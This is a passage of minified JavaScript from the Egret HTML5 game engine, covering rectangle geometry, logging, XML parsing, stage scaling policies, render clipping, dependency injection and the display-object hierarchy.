			return this.x < a.x && this.x + this.width > a.x && this.y < a.y && this.y + this.height > a.y ? !0 : !1
		};
		c.identity = new c(0, 0, 0, 0);
		return c
	}
	(d.HashObject);
	d.Rectangle = e;
	e.prototype.__class__ = "egret.Rectangle"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function e() {}

		e.fatal = function (c, a) {
			"undefined" === typeof a && (a = null);
			d.Logger.traceToConsole("Fatal", c, a);
			throw Error(d.Logger.getTraceCode("Fatal", c, a));
		};
		e.info = function (c, a) {
			"undefined" === typeof a && (a = null);
			d.Logger.traceToConsole("Info", c, a)
		};
		e.warning = function (c, a) {
			"undefined" === typeof a && (a = null);
			d.Logger.traceToConsole("Warning", c, a)
		};
		e.traceToConsole = function (c, a, b) {
			console.log(d.Logger.getTraceCode(c, a, b))
		};
		e.getTraceCode = function (c, a, b) {
			return "[" + c + "]" + a + ":" +
			(null == b ? "" : b)
		};
		return e
	}
	();
	d.Logger = e;
	e.prototype.__class__ = "egret.Logger"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._isSupportDOMParser = this._xmlDict = this._parser = null;
			this._xmlDict = {};
			window.DOMParser ? (this._isSupportDOMParser = !0, this._parser = new DOMParser) : this._isSupportDOMParser = !1
		}
		__extends(c, e);
		c.getInstance = function () {
			c._instance || (c._instance = new c);
			return c._instance
		};
		c.prototype.parserXML = function (a) {
			for (var b = 0; "\n" == a.charAt(b) || "\t" == a.charAt(b) || "\r" == a.charAt(b) || " " == a.charAt(b); )
				b++;
			0 != b && (a = a.substring(b, a.length));
			this._isSupportDOMParser ?
			b = this._parser.parseFromString(a, "text/xml") : (b = new ActiveXObject("Microsoft.XMLDOM"), b.async = "false", b.loadXML(a));
			null == b && d.Logger.info("xml not found!");
			return b
		};
		c._instance = null;
		return c
	}
	(d.HashObject);
	d.SAXParser = e;
	e.prototype.__class__ = "egret.SAXParser"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (b) {
		function a() {
			b.call(this);
			this._designHeight = this._designWidth = 0;
			this._scaleY = this._scaleX = 1;
			var c = document.getElementById(a.canvas_name),
			d = c.height;
			this._designWidth = c.width;
			this._designHeight = d
		}
		__extends(a, b);
		a.getInstance = function () {
			null == a.instance && (c.initialize(), a.instance = new a);
			return a.instance
		};
		a.prototype.setDesignSize = function (b, a, m) {
			this._designWidth = b;
			this._designHeight = a;
			m && (d.Logger.warning("\u8be5\u65b9\u6cd5\u76ee\u524d\u4e0d\u5e94\u4f20\u5165 resolutionPolicy \u53c2\u6570\uff0c\u8bf7\u5728 docs/1.0_Final_ReleaseNote\u4e2d\u67e5\u770b\u5982\u4f55\u5347\u7ea7"),
				this._setResolutionPolicy(m))
		};
		a.prototype._setResolutionPolicy = function (b) {
			this._resolutionPolicy = b;
			b.init(this);
			b._apply(this, this._designWidth, this._designHeight)
		};
		a.prototype.getScaleX = function () {
			return this._scaleX
		};
		a.prototype.getScaleY = function () {
			return this._scaleY
		};
		a.canvas_name = "gameCanvas";
		a.canvas_div_name = "gameDiv";
		return a
	}
	(d.HashObject);
	d.StageDelegate = e;
	e.prototype.__class__ = "egret.StageDelegate";
	var f = function () {
		function a(b, m) {
			this.setContainerStrategy(b);
			this.setContentStrategy(m)
		}
		a.prototype.init = function (b) {
			this._containerStrategy.init(b);
			this._contentStrategy.init(b)
		};
		a.prototype._apply = function (b, a, m) {
			this._containerStrategy._apply(b, a, m);
			this._contentStrategy._apply(b, a, m)
		};
		a.prototype.setContainerStrategy = function (b) {
			b instanceof c && (this._containerStrategy = b)
		};
		a.prototype.setContentStrategy = function (a) {
			a instanceof b && (this._contentStrategy = a)
		};
		return a
	}
	();
	d.ResolutionPolicy = f;
	f.prototype.__class__ = "egret.ResolutionPolicy";
	var c = function () {
		function b() {}

		b.initialize =
		function () {
			b.EQUAL_TO_FRAME = new a
		};
		b.prototype.init = function (b) {};
		b.prototype._apply = function (b, a, m) {};
		b.prototype._setupContainer = function () {
			var b = document.body,
			a;
			b && (a = b.style) && (a.paddingTop = a.paddingTop || "0px", a.paddingRight = a.paddingRight || "0px", a.paddingBottom = a.paddingBottom || "0px", a.paddingLeft = a.paddingLeft || "0px", a.borderTop = a.borderTop || "0px", a.borderRight = a.borderRight || "0px", a.borderBottom = a.borderBottom || "0px", a.borderLeft = a.borderLeft || "0px", a.marginTop = a.marginTop || "0px", a.marginRight =
					a.marginRight || "0px", a.marginBottom = a.marginBottom || "0px", a.marginLeft = a.marginLeft || "0px")
		};
		return b
	}
	();
	d.ContainerStrategy = c;
	c.prototype.__class__ = "egret.ContainerStrategy";
	var a = function (b) {
		function a() {
			b.apply(this, arguments)
		}
		__extends(a, b);
		a.prototype._apply = function (b) {
			this._setupContainer()
		};
		return a
	}
	(c);
	d.EqualToFrame = a;
	a.prototype.__class__ = "egret.EqualToFrame";
	var b = function () {
		function b() {}

		b.prototype.init = function (b) {};
		b.prototype._apply = function (b, a, m) {};
		return b
	}
	();
	d.ContentStrategy =
		b;
	b.prototype.__class__ = "egret.ContentStrategy";
	f = function (b) {
		function a(c) {
			"undefined" === typeof c && (c = 0);
			b.call(this);
			this.minWidth = c
		}
		__extends(a, b);
		a.prototype._apply = function (b, a, m) {
			a = document.getElementById(e.canvas_name);
			var c = document.getElementById(e.canvas_div_name),
			d = document.documentElement.clientWidth,
			u = document.documentElement.clientHeight,
			f = u / m,
			p = d / f,
			r = 1;
			0 != this.minWidth && (r = Math.min(1, p / this.minWidth));
			a.width = p / r;
			a.height = m;
			a.style.width = d + "px";
			a.style.height = u * r + "px";
			c.style.width =
				d + "px";
			c.style.height = u * r + "px";
			b._scaleX = f * r;
			b._scaleY = f * r
		};
		return a
	}
	(b);
	d.FixedHeight = f;
	f.prototype.__class__ = "egret.FixedHeight";
	f = function (b) {
		function a(c) {
			"undefined" === typeof c && (c = 0);
			b.call(this);
			this.minHeight = c
		}
		__extends(a, b);
		a.prototype._apply = function (b, a, m) {
			m = document.getElementById(e.canvas_name);
			var c = document.getElementById(e.canvas_div_name),
			d = document.documentElement.clientWidth,
			u = document.documentElement.clientHeight,
			f = d / a,
			p = u / f,
			r = 1;
			0 != this.minHeight && (r = Math.min(1, p / this.minHeight));
			m.width = a;
			m.height = p / r;
			m.style.width = d * r + "px";
			m.style.height = u + "px";
			c.style.width = d * r + "px";
			c.style.height = u + "px";
			b._scaleX = f * r;
			b._scaleY = f * r
		};
		return a
	}
	(b);
	d.FixedWidth = f;
	f.prototype.__class__ = "egret.FixedWidth";
	f = function (b) {
		function a(c, d) {
			b.call(this);
			this.width = c;
			this.height = d
		}
		__extends(a, b);
		a.prototype._apply = function (b, a, m) {
			m = document.getElementById(e.canvas_name);
			var c = document.getElementById(e.canvas_div_name),
			d = this.width,
			u = this.height,
			f = d / a;
			m.width = a;
			m.height = u / f;
			m.style.width = d + "px";
			m.style.height =
				u + "px";
			c.style.width = d + "px";
			c.style.height = u + "px";
			b._scaleX = f;
			b._scaleY = f
		};
		return a
	}
	(b);
	d.FixedSize = f;
	f.prototype.__class__ = "egret.FixedSize";
	f = function (b) {
		function a() {
			b.call(this)
		}
		__extends(a, b);
		a.prototype._apply = function (b, a, m) {
			a = document.getElementById(e.canvas_name);
			a.style.width = a.width + "px";
			a.style.height = a.height + "px";
			b._scaleX = 1;
			b._scaleY = 1
		};
		return a
	}
	(b);
	d.NoScale = f;
	f.prototype.__class__ = "egret.NoScale"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._originalData = {};
			this._drawAreaList = []
		}
		__extends(c, e);
		c.getInstance = function () {
			null == c.instance && (c.instance = new c);
			return c.instance
		};
		c.prototype.addDrawArea = function (a) {
			this._drawAreaList.push(a)
		};
		c.prototype.clearDrawArea = function () {
			this._drawAreaList = []
		};
		c.prototype.drawImage = function (a, b, m, c, e, f, g, l, k, n) {
			g = g || 0;
			l = l || 0;
			var q = b._texture_to_render;
			if (null != q && 0 != f && 0 != e && 0 != k && 0 != n)
				if (b._worldBounds) {
					var p = this._originalData;
					p.sourceX =
						m;
					p.sourceY = c;
					p.sourceWidth = e;
					p.sourceHeight = f;
					p.destX = g;
					p.destY = l;
					p.destWidth = k;
					p.destHeight = n;
					for (var r = this.getDrawAreaList(), x = 0; x < r.length; x++) {
						var z = r[x];
						if (!this.ignoreRender(b, z, p.destX, p.destY)) {
							if (0 != this._drawAreaList.length)
								if (0 != b._worldTransform.b || 0 != b._worldTransform.c) {
									if (b._worldBounds.x + p.destX < z.x || b._worldBounds.y + p.destY < z.y || b._worldBounds.x + b._worldBounds.width + p.destX > z.x + z.width || b._worldBounds.y + b._worldBounds.height + p.destY > z.y + z.height) {
										d.Logger.fatal("\u8bf7\u4e0d\u8981\u8ba9\u5e26\u6709\u65cb\u8f6c\u548c\u659c\u5207\u7684\u663e\u793a\u5bf9\u8c61\u8de8\u8fc7\u91cd\u7ed8\u533a\u57df");
										break
									}
								} else {
									var v = b._worldTransform.a,
									A = b._worldTransform.d,
									t;
									b._worldBounds.x + p.destX < z.x && (t = (z.x - b._worldBounds.x) / v - p.destX, m += t / (k / e), e -= t / (k / e), k -= t, g += t);
									b._worldBounds.y + p.destY < z.y && (t = (z.y - b._worldBounds.y) / A - p.destY, c += t / (n / f), f -= t / (n / f), n -= t, l += t);
									b._worldBounds.x + b._worldBounds.width + p.destX > z.x + z.width && (t = (b._worldBounds.x + b._worldBounds.width - z.x - z.width) / v + p.destX, e -= t / (k / e), k -= t);
									b._worldBounds.y + b._worldBounds.height + p.destY > z.y + z.height && (t = (b._worldBounds.y + b._worldBounds.height -
											z.y - z.height) / A + p.destY, f -= t / (n / f), n -= t)
								}
							a.drawImage(q, m, c, e, f, g, l, k, n)
						}
					}
				} else
					a.drawImage(q, m, c, e, f, g, l, k, n)
		};
		c.prototype.ignoreRender = function (a, b, m, c) {
			var d = a._worldBounds;
			m *= a._worldTransform.a;
			c *= a._worldTransform.d;
			return d.x + d.width + m <= b.x || d.x + m >= b.x + b.width || d.y + d.height + c <= b.y || d.y + c >= b.y + b.height ? !0 : !1
		};
		c.prototype.getDrawAreaList = function () {
			var a;
			0 == this._drawAreaList.length ? (this._defaultDrawAreaList || (this._defaultDrawAreaList = [new d.Rectangle(0, 0, d.MainContext.instance.stage.stageWidth,
							d.MainContext.instance.stage.stageHeight)]), a = this._defaultDrawAreaList) : a = this._drawAreaList;
			return a
		};
		return c
	}
	(d.HashObject);
	d.RenderFilter = e;
	e.prototype.__class__ = "egret.RenderFilter"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function e() {}

		e.mapClass = function (c, a, b) {
			"undefined" === typeof b && (b = "");
			c = this.getKey(c) + "#" + b;
			this.mapClassDic[c] = a
		};
		e.getKey = function (c) {
			return "string" == typeof c ? c : d.getQualifiedClassName(c)
		};
		e.mapValue = function (c, a, b) {
			"undefined" === typeof b && (b = "");
			c = this.getKey(c) + "#" + b;
			this.mapValueDic[c] = a
		};
		e.hasMapRule = function (c, a) {
			"undefined" === typeof a && (a = "");
			var b = this.getKey(c) + "#" + a;
			return this.mapValueDic[b] || this.mapClassDic[b] ? !0 : !1
		};
		e.getInstance = function (c, a) {
			"undefined" ===
			typeof a && (a = "");
			var b = this.getKey(c) + "#" + a;
			if (this.mapValueDic[b])
				return this.mapValueDic[b];
			var m = this.mapClassDic[b];
			if (m)
				return m = new m, this.mapValueDic[b] = m, delete this.mapClassDic[b], m;
			throw Error("\u8c03\u7528\u4e86\u672a\u914d\u7f6e\u7684\u6ce8\u5165\u89c4\u5219:" + b + "\u3002 \u8bf7\u5148\u5728\u9879\u76ee\u521d\u59cb\u5316\u91cc\u914d\u7f6e\u6307\u5b9a\u7684\u6ce8\u5165\u89c4\u5219\uff0c\u518d\u8c03\u7528\u5bf9\u5e94\u5355\u4f8b\u3002");
		};
		e.mapClassDic = {};
		e.mapValueDic = {};
		return e
	}
	();
	d.Injector =
		e;
	e.prototype.__class__ = "egret.Injector"
})(egret || (egret = {}));
(function (d) {
	var e = function () {
		function d() {}

		d.NORMAL = "normal";
		d.ADD = "add";
		d.LAYER = "layer";
		return d
	}
	();
	d.BlendMode = e;
	e.prototype.__class__ = "egret.BlendMode"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._sizeDirty = this._normalDirty = !0;
			this._parent = null;
			this._cacheAsBitmap = !1;
			this._y = this._x = 0;
			this._scaleY = this._scaleX = 1;
			this._anchorY = this._anchorX = this._anchorOffsetY = this._anchorOffsetX = 0;
			this._visible = !0;
			this._rotation = 0;
			this._alpha = 1;
			this._skewY = this._skewX = 0;
			this._hasHeightSet = this._hasWidthSet = !1;
			this.worldAlpha = 1;
			this._rectH = this._rectW = 0;
			this._worldTransform = new d.Matrix;
			this._cacheBounds = new d.Rectangle(0, 0, 0, 0)
		}
		__extends(c, e);
		c.prototype._setDirty = function () {
			this._normalDirty = !0
		};
		c.prototype.getDirty = function () {
			return this._normalDirty || this._sizeDirty
		};
		c.prototype._setParentSizeDirty = function () {
			!this.parent || this.parent._hasWidthSet || this.parent._hasHeightSet || this.parent._setSizeDirty()
		};
		c.prototype._setSizeDirty = function () {
			this._sizeDirty || (this._sizeDirty = !0, this._setDirty(), this._setParentSizeDirty())
		};
		c.prototype._clearDirty = function () {
			this._normalDirty = !1
		};
		c.prototype._clearSizeDirty = function () {
			this._sizeDirty =
				!1
		};
		Object.defineProperty(c.prototype, "parent", {
			get : function () {
				return this._parent
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._parentChanged = function (a) {
			this._parent = a
		};
		Object.defineProperty(c.prototype, "x", {
			get : function () {
				return this._x
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._x = a, this._setDirty(), this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "y", {
			get : function () {
				return this._y
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._y = a, this._setDirty(),
					this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "scaleX", {
			get : function () {
				return this._scaleX
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._scaleX = a, this._setDirty(), this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "scaleY", {
			get : function () {
				return this._scaleY
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._scaleY = a, this._setDirty(), this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype,
			"anchorOffsetX", {
			get : function () {
				return this._anchorOffsetX
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._anchorOffsetX = a, this._setDirty(), this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "anchorOffsetY", {
			get : function () {
				return this._anchorOffsetY
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._anchorOffsetY = a, this._setDirty(), this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "anchorX", {
			get : function () {
				return this._anchorX
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._anchorX = a, this._setDirty(), this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "anchorY", {
			get : function () {
				return this._anchorY
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._anchorY = a, this._setDirty(), this._setParentSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "visible", {
			get : function () {
				return this._visible
			},
			set : function (a) {
				this._visible = a;
				this._setSizeDirty()
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "rotation", {
			get : function () {
				return this._rotation
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._rotation = a, this._setSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "alpha", {
			get : function () {
				return this._alpha
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._alpha = a, this._setDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "skewX", {
			get : function () {
				return this._skewX
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) &&
				(this._skewX = a, this._setSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "skewY", {
			get : function () {
				return this._skewY
			},
			set : function (a) {
				d.NumberUtils.isNumber(a) && (this._skewY = a, this._setSizeDirty())
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "touchEnabled", {
			get : function () {
				return this._touchEnabled
			},
			set : function (a) {
				this._touchEnabled = a
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "scrollRect", {
			get : function () {
				return this._scrollRect
			},
			set : function (a) {
				this._scrollRect = a;
				this._setSizeDirty()
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "measuredWidth", {
			get : function () {
				return this._measureBounds().width
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "measuredHeight", {
			get : function () {
				return this._measureBounds().height
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "explicitWidth", {
			get : function () {
				return this._explicitWidth
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype,
			"explicitHeight", {
			get : function () {
				return this._explicitHeight
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "width", {
			get : function () {
				return this._getSize(d.Rectangle.identity).width
			},
			set : function (a) {
				this._setWidth(a)
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "height", {
			get : function () {
				return this._getSize(d.Rectangle.identity).height
			},
			set : function (a) {
				this._setHeight(a)
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype._setWidth = function (a) {
			this._setSizeDirty();
			this._explicitWidth = a;
			this._hasWidthSet = d.NumberUtils.isNumber(a)
		};
		c.prototype._setHeight = function (a) {
			this._setSizeDirty();
			this._explicitHeight = a;
			this._hasHeightSet = d.NumberUtils.isNumber(a)
		};
		c.prototype._draw = function (a) {
			if (this.visible && !this.drawCacheTexture(a)) {
				a.setAlpha(this.worldAlpha, this.blendMode);
				a.setTransform(this._worldTransform);
				var b = this.mask || this._scrollRect;
				b && a.pushMask(b);
				this._render(a);
				b && a.popMask()
			}
			this.destroyCacheBounds()
		};
		c.prototype.drawCacheTexture = function (a) {
			if (this._cacheAsBitmap) {
				var b =
					this._texture_to_render,
				c = b._offsetX,
				e = b._offsetY,
				f = b._textureWidth,
				b = b._textureHeight;
				this._updateTransform();
				a.setAlpha(this.worldAlpha, this.blendMode);
				a.setTransform(this._worldTransform);
				var h = d.MainContext.instance.rendererContext.texture_scale_factor;
				d.RenderFilter.getInstance().drawImage(a, this, 0, 0, f * h, b * h, c, e, f, b);
				return !0
			}
			return !1
		};
		c.prototype._updateTransform = function () {
			this._worldTransform.identity().appendMatrix(this._parent._worldTransform);
			var a = this._getOffsetPoint();
			this._worldTransform.appendTransform(this._x,
				this._y, this._scaleX, this._scaleY, this._rotation, this._skewX, this._skewY, a.x, a.y);
			this._scrollRect && this._worldTransform.append(1, 0, 0, 1, -this._scrollRect.x, -this._scrollRect.y);
			this.worldAlpha = this._parent.worldAlpha * this._alpha
		};
		c.prototype._render = function (a) {};
		c.prototype.getBounds = function (a) {
			var b = this._measureBounds(),
			c = this._hasWidthSet ? this._explicitWidth : b.width,
			e = this._hasHeightSet ? this._explicitHeight : b.height,
			f = b.x,
			b = b.y,
			h,
			g;
			0 != this._anchorX || 0 != this._anchorY ? (h = c * this._anchorX, g = e * this._anchorY) :
			(h = this._anchorOffsetX, g = this._anchorOffsetY);
			this._cacheBounds.initialize(f - h, b - g, c, e);
			c = this._cacheBounds;
			a || (a = new d.Rectangle);
			return a.initialize(c.x, c.y, c.width, c.height)
		};
		c.prototype.destroyCacheBounds = function () {
			this._cacheBounds.x = 0;
			this._cacheBounds.y = 0;
			this._cacheBounds.width = 0;
			this._cacheBounds.height = 0
		};
		c.prototype._getConcatenatedMatrix = function () {
			for (var a = c.identityMatrixForGetConcatenated.identity(), b = this; null != b; ) {
				if (0 != b._anchorX || 0 != b._anchorY) {
					var m = b._getSize(d.Rectangle.identity);
					a.prependTransform(b._x, b._y, b._scaleX, b._scaleY, b._rotation, b._skewX, b._skewY, m.width * b._anchorX, m.height * b._anchorY)
				} else
					a.prependTransform(b._x, b._y, b._scaleX, b._scaleY, b._rotation, b._skewX, b._skewY, b._anchorOffsetX, b._anchorOffsetY);
				b = b._parent
			}
			return a
		};
		c.prototype.localToGlobal = function (a, b, c) {
			"undefined" === typeof a && (a = 0);
			"undefined" === typeof b && (b = 0);
			var e = this._getConcatenatedMatrix();
			e.append(1, 0, 0, 1, a, b);
			c || (c = new d.Point);
			c.x = e.tx;
			c.y = e.ty;
			return c
		};
		c.prototype.globalToLocal = function (a,
			b, c) {
			"undefined" === typeof a && (a = 0);
			"undefined" === typeof b && (b = 0);
			var e = this._getConcatenatedMatrix();
			e.invert();
			e.append(1, 0, 0, 1, a, b);
			c || (c = new d.Point);
			c.x = e.tx;
			c.y = e.ty;
			return c
		};
		c.prototype.hitTest = function (a, b, c) {
			"undefined" === typeof c && (c = !1);
			if (!this.visible || !c && !this._touchEnabled)
				return null;
			c = this._getSize(d.Rectangle.identity);
			return 0 <= a && a < c.width && 0 <= b && b < c.height ? this.mask || this._scrollRect ? this._scrollRect && a < this._scrollRect.width && b < this._scrollRect.height || this.mask && this.mask.x <=
			a && a < this.mask.x + this.mask.width && this.mask.y <= b && b < this.mask.y + this.mask.height ? this : null : this : null
		};
		c.prototype.hitTestPoint = function (a, b, c) {
			a = this.globalToLocal(a, b);
			return c ? (this._hitTestPointTexture || (this._hitTestPointTexture = new d.RenderTexture), c = this._hitTestPointTexture, c.drawToTexture(this), 0 != c.getPixel32(a.x - this._hitTestPointTexture._offsetX, a.y - this._hitTestPointTexture._offsetY)[3] ? !0 : !1) : !!this.hitTest(a.x, a.y, !0)
		};
		c.prototype._getMatrix = function () {
			var a = d.Matrix.identity.identity(),
			b = this._getOffsetPoint();
			a.appendTransform(this._x, this._y, this._scaleX, this._scaleY, this._rotation, this._skewX, this._skewY, b.x, b.y);
			return a
		};
		c.prototype._getSize = function (a) {
			return this._hasHeightSet && this._hasWidthSet ? a.initialize(0, 0, this._explicitWidth, this._explicitHeight) : this._measureSize(d.Rectangle.identity)
		};
		c.prototype._measureSize = function (a) {
			this._sizeDirty ? (a = this._measureBounds(), this._rectW = a.width, this._rectH = a.height, this._clearSizeDirty()) : (a.width = this._rectW, a.height = this._rectH);
			return a
		};
		c.prototype._measureBounds = function () {
			return d.Rectangle.identity.initialize(0, 0, 0, 0)
		};
		c.prototype._getOffsetPoint = function () {
			var a = this._anchorOffsetX,
			b = this._anchorOffsetY;
			if (0 != this._anchorX || 0 != this._anchorY)
				b = this._getSize(d.Rectangle.identity), a = this._anchorX * b.width, b = this._anchorY * b.height;
			var c = d.Point.identity;
			c.x = a;
			c.y = b;
			return c
		};
		c.prototype._onAddToStage = function () {
			this._stage = d.MainContext.instance.stage;
			d.DisplayObjectContainer.__EVENT__ADD_TO_STAGE_LIST.push(this)
		};
		c.prototype._onRemoveFromStage =
		function () {
			this._stage = null;
			d.DisplayObjectContainer.__EVENT__REMOVE_FROM_STAGE_LIST.push(this)
		};
		Object.defineProperty(c.prototype, "stage", {
			get : function () {
				return this._stage
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.addEventListener = function (a, b, m, u, y) {
			"undefined" === typeof u && (u = !1);
			"undefined" === typeof y && (y = 0);
			e.prototype.addEventListener.call(this, a, b, m, u, y);
			((u = a == d.Event.ENTER_FRAME) || a == d.Event.RENDER) && this._insertEventBin(u ? c._enterFrameCallBackList : c._renderCallBackList, b, m, y)
		};
		c.prototype.removeEventListener =
		function (a, b, m, u) {
			"undefined" === typeof u && (u = !1);
			e.prototype.removeEventListener.call(this, a, b, m, u);
			((u = a == d.Event.ENTER_FRAME) || a == d.Event.RENDER) && this._removeEventBin(u ? c._enterFrameCallBackList : c._renderCallBackList, b, m)
		};
		c.prototype.dispatchEvent = function (a) {
			if (!a._bubbles)
				return e.prototype.dispatchEvent.call(this, a);
			for (var b = [], c = this; c; )
				b.unshift(c), c = c.parent;
			for (var d = b.length, c = d - 1, d = d - 2; 0 <= d; d--)
				b.push(b[d]);
			a._reset();
			this._dispatchPropagationEvent(a, b, c);
			return !a.isDefaultPrevented()
		};
		c.prototype._dispatchPropagationEvent = function (a, b, c) {
			for (var d = b.length, e = 0; e < d; e++) {
				var f = b[e];
				a._setCurrentTarget(f);
				a._target = this;
				a._eventPhase = e < c ? 1 : e == c ? 2 : 3;
				f._notifyListener(a);
				if (a._isPropagationStopped || a._isPropagationImmediateStopped)
					break
			}
		};
		c.prototype.willTrigger = function (a) {
			for (var b = this; b; ) {
				if (b.hasEventListener(a))
					return !0;
				b = b._parent
			}
			return !1
		};
		Object.defineProperty(c.prototype, "cacheAsBitmap", {
			get : function () {
				return this._cacheAsBitmap
			},
			set : function (a) {
				(this._cacheAsBitmap = a) ? (this.renderTexture ||
					(this.renderTexture = new d.RenderTexture), this.renderTexture.drawToTexture(this), this._texture_to_render = this.renderTexture) : this._texture_to_render = null
			},
			enumerable : !0,
			configurable : !0
		});
		c.getTransformBounds = function (a, b) {
			var c,
			d,
			e = a.width,
			f = a.height,
			g = e * b.a,
			e = e * b.b,
			l = f * b.c,
			f = f * b.d,
			k = b.tx,
			n = b.ty,
			q = k,
			p = k,
			r = n,
			x = n;
			(c = g + k) < q ? q = c : c > p && (p = c);
			(c = g + l + k) < q ? q = c : c > p && (p = c);
			(c = l + k) < q ? q = c : c > p && (p = c);
			(d = e + n) < r ? r = d : d > x && (x = d);
			(d = e + f + n) < r ? r = d : d > x && (x = d);
			(d = f + n) < r ? r = d : d > x && (x = d);
			return a.initialize(q, r, p - q, x - r)
		};
		c.identityMatrixForGetConcatenated =
			new d.Matrix;
		c._enterFrameCallBackList = [];
		c._renderCallBackList = [];
		return c
	}
	(d.EventDispatcher);
	d.DisplayObject = e;
	e.prototype.__class__ = "egret.DisplayObject"
})(egret || (egret = {}));
__extends = this.__extends || function (d, e) {
	function f() {
		this.constructor = d
	}
	for (var c in e)
		e.hasOwnProperty(c) && (d[c] = e[c]);
	f.prototype = e.prototype;
	d.prototype = new f
};
(function (d) {
	var e = function (e) {
		function c() {
			e.call(this);
			this._touchChildren = !0;
			this._children = []
		}
		__extends(c, e);
		Object.defineProperty(c.prototype, "touchChildren", {
			get : function () {
				return this._touchChildren
			},
			set : function (a) {
				this._touchChildren = a
			},
			enumerable : !0,
			configurable : !0
		});
		Object.defineProperty(c.prototype, "numChildren", {
			get : function () {
				return this._children.length
			},
			enumerable : !0,
			configurable : !0
		});
		c.prototype.setChildIndex = function (a, b) {
			this.doSetChildIndex(a, b)
		};
		c.prototype.doSetChildIndex = function (a,
			b) {
			var c = this._children.indexOf(a);
			0 > c && d.Logger.fatal("child\u4e0d\u5728\u5f53\u524d\u5bb9\u5668\u5185");
			this._children.splice(c, 1);
			0 > b || this._children.length <= b ? this._children.push(a) : this._children.splice(b, 0, a)
		};
		c.prototype.addChild = function (a) {
			var b = this.numChildren;
			a._parent == this && b--;
			return this._doAddChild(a, b)
		};
		c.prototype.addChildAt = function (a, b) {
			return this._doAddChild(a, b)
		};
		c.prototype._doAddChild = function (a, b, m) {
			"undefined" === typeof m && (m = !0);
			if (a == this)
				return a;
			if (0 > b || b > this._children.length)
				return d.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4"),
				a;
			var e = a.parent;
			if (e == this)
				return this.doSetChildIndex(a, b), a;
			e && e.removeChild(a);
			this._children.splice(b, 0, a);
			a._parentChanged(this);
			m && a.dispatchEventWith(d.Event.ADDED, !0);
			if (this._stage)
				for (a._onAddToStage(), b = c.__EVENT__ADD_TO_STAGE_LIST; 0 < b.length; )
					b.shift().dispatchEventWith(d.Event.ADDED_TO_STAGE);
			a._setDirty();
			this._setSizeDirty();
			return a
		};
		c.prototype.removeChild = function (a) {
			a = this._children.indexOf(a);
			if (0 <= a)
				return this._doRemoveChild(a);
			d.Logger.fatal("child\u672a\u88abaddChild\u5230\u8be5parent");
			return null
		};
		c.prototype.removeChildAt = function (a) {
			if (0 <= a && a < this._children.length)
				return this._doRemoveChild(a);
			d.Logger.fatal("\u63d0\u4f9b\u7684\u7d22\u5f15\u8d85\u51fa\u8303\u56f4");
			return null
		};
		c.prototype._doRemoveChild = function (a, b) {
			"undefined" === typeof b && (b = !0);
			var m = this._children,
			e = m[a];
			b && e.dispatchEventWith(d.Event.REMOVED, !0);
